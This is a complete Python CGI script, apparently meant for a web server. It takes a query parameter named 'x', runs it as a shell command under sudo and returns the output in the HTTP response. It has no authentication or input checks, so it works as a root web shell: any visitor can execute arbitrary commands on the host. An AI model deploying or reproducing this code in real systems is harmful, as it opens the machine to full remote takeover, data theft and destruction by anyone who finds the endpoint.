#!/usr/bin/python3

import cgi
import subprocess

print("content: text/html")
print()

f = cgi.FieldStorage()

cmd = f.getvalue("x")

o = subprocess.getoutput("sudo " +  cmd)

print(o)
